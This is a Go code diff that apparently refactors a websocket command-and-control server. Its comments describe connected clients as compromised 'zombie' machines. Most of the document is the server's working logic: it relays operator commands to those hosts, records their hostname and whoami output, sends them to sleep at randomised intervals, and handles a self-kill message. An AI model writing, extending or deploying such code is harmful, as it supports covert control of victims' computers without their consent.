@@ -5,8 +5,8 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
-	"github.com/pkg/errors"
 	"golang.org/x/net/websocket"
 	"io/ioutil"
 	"math/big"
@@ -32,15 +32,14 @@ const (
 
 var (
 	redisClient     redis.RedisClient
-	clients_control = make(map[string]string)          //客户端ip和控制台uuid的对应
-	control_clients = make(map[string]string)          //控制台uuid和客户端ip的对应
-	control         = make(map[string]*websocket.Conn) //控制台uuid和控制台conn
-	controlKey      = make(map[*websocket.Conn]string) //控制台conn连接和控制台uuid便于查找
+	clients_control = NewLockMapSS() //客户端唯一识别码和控制台uuid的对应
+	control_clients = NewLockMapSS() //控制台uuid和客户端唯一识别码的对应
+	control         = NewLockMapSC() //控制台uuid和控制台conn
+	controlKey      = NewLockMapCS() //控制台conn连接和控制台uuid便于查找
 
-	controlMsgs = make(chan Message, 500)          //发给控制端的消息
-	clients     = make(map[string]*websocket.Conn) //客户端ip和客户端conn连接
-	clientMsgs  = make(chan Message, 500)          //发给客户端的消息
-	//clientSleepMsg  = map[string]Message{} //客户端睡眠时发给他的消息
+	controlMsgs = make(chan Message, 500) //发给控制端的消息
+	clients     = NewLockMapSC()          //客户端唯一识别码和客户端conn连接
+	clientMsgs  = make(chan Message, 500) //发给客户端的消息
 )
 
 //zsetKey
@@ -156,26 +155,25 @@ func svrConnClientHandler(conn *websocket.Conn) {
 		if msg.Msg == "0" { //解除休眠
 			_ = redisClient.Del(redisSLEEP(machineid))
 		} else {
-			delete(clients, machineid) //还有休眠，删除连接池中连接
+			clients.Delete(machineid) //还有休眠，删除连接池中连接
 			return
 		}
 
 	}
-	clients[machineid] = conn //确认没休眠，存入连接池
+	clients.Set(machineid, conn) //确认没休眠，存入连接池
 	for {
 		reqbyts, err := readMessage(conn) //接客户端收传回来的消息传给控制台
+		now := time.Now().Format("2006-01-02 15:04:05")
 		if err != nil {
-			delete(clients, machineid)
-			now := time.Now().Format("2006-01-02 15:04:05")
+			clients.Delete(machineid)
 			fmt.Println(now, ip, machineid, "断开连接")
-			break
+			return
 		}
 		reqbyts = encDec(reqbyts) //解密
 		message, err := json2Message(reqbyts)
 		if err != nil {
-			now := time.Now().Format("2006-01-02 15:04:05")
 			fmt.Println(now, ip, machineid, "解密后转Message错误:", reqbyts)
-			delete(clients, machineid)
+			clients.Delete(machineid)
 			return
 		}
 		if message.Name == GET_HEART { //发送的（hostname）心跳信息
@@ -186,17 +184,16 @@ func svrConnClientHandler(conn *websocket.Conn) {
 				_ = redisClient.Hmset(redisINFO(machineid), hostMap) //保存客户端信息
 			}
 			message.Machineid = machineid
-			clientMsgs <- message // 反应客户端
-			continue              //心跳消息只服务器保存，无需发送到控制台
+			//clientMsgs <- message // 反应客户端
+			continue //心跳消息只服务器保存，无需发送到控制台
 		} else if message.Name == SEND_MSG { //返回给控制台的信息
 			err := redisClient.APPEND(redisMSG(machineid), message.Msg+"\r\n")
 			if err != nil {
-				now := time.Now().Format("2006-01-02 15:04:05")
 				fmt.Println(now, "客户端存历史消息失败：", err)
 			}
 		} else if message.Name == KILL_ME { //肉鸡已自杀
 			_ = redisClient.APPEND(redisMSG(machineid), ip+" KILL OK!\r\n")
-			delete(clients, machineid)
+			clients.Delete(machineid)
 			controlMsgs <- Message{Name: SEND_MSG, Machineid: machineid, Msg: ip + " KILL OK!\r\n"} //发给控制端状态
 			break                                                                                   //结束
 		}
@@ -245,18 +242,18 @@ func svrConnControlHandler(conn *websocket.Conn) {
 	}
 	for {
 		reqbyts, err := readMessage(conn) //接收控制台的消息{要操作的IP,消息类型Type,消息内容}，发给客户端
+		now := time.Now().Format("2006-01-02 15:04:05")
 		if err != nil {
-			uuid := controlKey[conn]
-			machineid := control_clients[uuid] //获取客户端唯一识别码
+			uuid := controlKey.Map[conn]
+			machineid := control_clients.Map[uuid] //获取客户端唯一识别码
 
-			delete(control, uuid)
-			delete(controlKey, conn)
-			delete(control_clients, uuid)
-			delete(clients_control, machineid)
+			control.Delete(uuid)
+			controlKey.Delete(conn)
+			control_clients.Delete(uuid)
+			clients_control.Delete(machineid)
 
-			now := time.Now().Format("2006-01-02 15:04:05")
 			fmt.Println(now, uuid+"控制台关闭")
-			break
+			return
 		}
 		reqbyts = encDec(reqbyts) //解密
 		message, err := json2Message(reqbyts)
@@ -265,45 +262,39 @@ func svrConnControlHandler(conn *websocket.Conn) {
 		}
 
 		if message.Name == SEND_MSG { //发给客户端的指令信息保存到redis
-			now := time.Now().Format("2006-01-02 15:04:05")
 			err := redisClient.APPEND(redisMSG(message.Machineid), "█"+now+">"+message.Msg+"\r\n")
 			if err != nil {
-				now := time.Now().Format("2006-01-02 15:04:05")
 				fmt.Println(now, "控制台存历史消息失败：", err)
 			}
 		} else if message.Name == GET_IP_LIST { //控制台获取客户端ip列表
 			err = ipList(conn) //发送ip列表到控制台
 			if err != nil {
-				now := time.Now().Format("2006-01-02 15:04:05")
 				fmt.Println(now, "控制台获取客户端ip列表失败：", err)
 			}
 			continue
 		} else if message.Name == UPDATE_REMARK { //控制台修改客户端备注信息
 			err := upRemark(message, conn)
 			if err != nil {
-				now := time.Now().Format("2006-01-02 15:04:05")
 				fmt.Println(now, "控制台修改客户端备注失败：", err)
 			}
 			continue
 		} else if message.Name == GET_OUT_TEXT { //控制台点击ip,读取客户端输出信息
 			err := readOutText(message, conn)
 			if err != nil {
-				now := time.Now().Format("2006-01-02 15:04:05")
 				fmt.Println(now, "控制台读取客户端输出信息失败：", err)
 			}
 			continue
 		} else if message.Name == CLEAN_OUT_TEXT { //清空客户端输出信息
 			err := cleanOutText(message)
 			if err != nil {
-				now := time.Now().Format("2006-01-02 15:04:05")
 				fmt.Println(now, "控制台读取客户端输出信息失败：", err)
 			}
 			continue
 		} else if message.Name == SLEEP_ROUSE { //休眠
 			if message.Msg != "0" {
-				if clientConn, ok := clients[message.Machineid]; ok {
+				if clientConn, ok := clients.Map[message.Machineid]; ok {
 					_ = clientConn.Close()
-					delete(clients, message.Machineid) //删除连接池中的连接
+					clients.Delete(message.Machineid) //删除连接池中的连接
 				}
 				reM := Message{Machineid: message.Machineid, Name: SEND_MSG, Msg: "sleep " + message.Msg + " OK!"}
 				_ = sendMessage(reM, conn) //返回控制台休眠结果
@@ -312,10 +303,10 @@ func svrConnControlHandler(conn *websocket.Conn) {
 			allSleep(conn)
 			continue
 		}
-		control[message.Uuid] = conn                      // 控制台链接存起来
-		controlKey[conn] = message.Uuid                   // 反存一个便于查找
-		clients_control[message.Machineid] = message.Uuid //客户端。控制台的对应关系存储起来
-		control_clients[message.Uuid] = message.Machineid //反存一个便于查找
+		control.Set(message.Uuid, conn)                      // 控制台链接存起来
+		controlKey.Set(conn, message.Uuid)                   // 反存一个便于查找
+		clients_control.Set(message.Machineid, message.Uuid) //客户端。控制台的对应关系存储起来
+		control_clients.Set(message.Uuid, message.Machineid) //反存一个便于查找
 		clientMsgs <- message
 	}
 }
@@ -324,12 +315,12 @@ func pushClientMsg() { //发送消息到客户端
 	for {
 		msg := <-clientMsgs
 		now := time.Now().Format("2006-01-02 15:04:05")
-		if conn, ok := clients[msg.Machineid]; ok { //查看此控制台操作的肉机是否连接中
+		if conn, ok := clients.Map[msg.Machineid]; ok { //查看此控制台操作的肉机是否连接中
 			err := sendMessage(msg, conn)
 			if err != nil {
 				fmt.Println(now, "报错了", msg)
-				clientSleepMsgCheck(msg)       //判断指令并添加到缓存
-				delete(clients, msg.Machineid) //删除连接池中的连接
+				clientSleepMsgCheck(msg)      //判断指令并添加到缓存
+				clients.Delete(msg.Machineid) //删除连接池中的连接
 			}
 		} else {
 			fmt.Println(now, "没连接", msg)
@@ -350,8 +341,8 @@ func clientSleepMsgCheck(msg Message) {
 func pushControlMsg() { //发送消息到控制台
 	for {
 		msg := <-controlMsgs
-		if controlUuid, ok := clients_control[msg.Machineid]; ok { //查看此客户端唯一id对应的控制台唯一id是否存在
-			if conn, ok2 := control[controlUuid]; ok2 { //拿到此控制台的连接
+		if controlUuid, ok := clients_control.Map[msg.Machineid]; ok { //查看此客户端唯一id对应的控制台唯一id是否存在
+			if conn, ok2 := control.Map[controlUuid]; ok2 { //拿到此控制台的连接
 				_ = sendMessage(msg, conn)
 			}
 		}
@@ -374,13 +365,13 @@ func sendMessage(message Message, conn *websocket.Conn) error {
 //休眠全部
 func allSleep(conn *websocket.Conn) {
 	msg := Message{Name: SEND_MSG}
-	for machineid, clientConn := range clients { //遍历线程池中连接
+	for machineid, clientConn := range clients.Map { //遍历线程池中连接
 		result, _ := rand.Int(rand.Reader, big.NewInt(30)) //30以内真随机数
 		sleepstr := fmt.Sprint(120 + result.Int64())
 		_ = redisClient.Set(redisSLEEP(machineid), sleepstr) //休眠时间设置到redis中
 
-		_ = clientConn.Close()     //关闭与客户端的连接
-		delete(clients, machineid) //删除连接池中的连接
+		_ = clientConn.Close()    //关闭与客户端的连接
+		clients.Delete(machineid) //删除连接池中的连接
 		msg.Msg = machineid + " sleep " + sleepstr
 		_ = sendMessage(msg, conn)
 	}
@@ -394,8 +385,8 @@ func cleanOutText(message Message) error {
 	return nil
 }
 func readOutText(message Message, conn *websocket.Conn) error {
-	if uuid, ok := clients_control[message.Machineid]; ok { //此客户端ip上一个被操作的控制端uuid是谁
-		if control_clients[uuid] == message.Machineid { //此uuid控制端现在操作的ip是我要操作的ip
+	if uuid, ok := clients_control.Map[message.Machineid]; ok { //此客户端ip上一个被操作的控制端uuid是谁
+		if control_clients.Map[uuid] == message.Machineid { //此uuid控制端现在操作的ip是我要操作的ip
 			message.Uuid = uuid //这个人正在操作
 		} else {
 			message.Uuid = "" //没人操作,需要清空此uuid,以免冲突
@@ -433,7 +424,7 @@ func ipList(conn *websocket.Conn) error {
 		score := datas[i+1]
 		scoreInt64, _ := strconv.ParseInt(score, 10, 64)
 		values, _ := redisClient.Hmget(redisINFO(machineid), "hostname", "whoami", "remark", "ip")
-		if _, ok := clients[machineid]; ok { //正在连接中的ip弄个小标签
+		if _, ok := clients.Map[machineid]; ok { //正在连接中的ip弄个小标签
 			condom.IP = "*" + values[3]
 		} else {
 			condom.IP = values[3]
